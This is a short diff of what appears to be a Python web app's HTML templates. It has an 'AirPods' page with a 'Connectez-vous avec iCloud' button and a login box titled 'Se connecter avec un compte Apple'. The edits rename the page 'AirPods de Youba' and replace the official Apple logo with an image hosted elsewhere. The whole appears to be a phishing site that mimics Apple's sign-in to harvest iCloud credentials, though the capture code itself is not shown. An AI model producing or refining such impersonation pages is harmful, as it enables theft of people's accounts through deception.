@@ -57,7 +57,7 @@ airpods_page = """
 <body>
     <img src="https://i.ibb.co/zHQBkrHX/airpods.jpg" 
          alt="AirPods" class="airpods-image">
-    <h1>AirPods</h1>
+    <h1>AirPods de Youba</h1>
     <a href="/login" class="login-button">Connectez-vous avec iCloud</a>
 </body>
 </html>
@@ -91,9 +91,9 @@ base_html = """
             text-align: center;
         }}
         .apple-logo {{
-            width: 44px;
-            height: 44px;
-            margin-bottom: 20px;
+            width: 150px;
+            height: 150px;
+            margin-bottom: 10px;
         }}
         h1 {{
             font-size: 24px;
@@ -182,7 +182,7 @@ base_html = """
 </head>
 <body>
 <div class="login-container">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" class="apple-logo">
+    <img src="https://i.ibb.co/kddN5ht/Capture-d-cran-du-2025-05-21-09-26-14.png" class="apple-logo">
     <h2>Se connecter avec un compte Apple</h2>
     {content}
 </div>
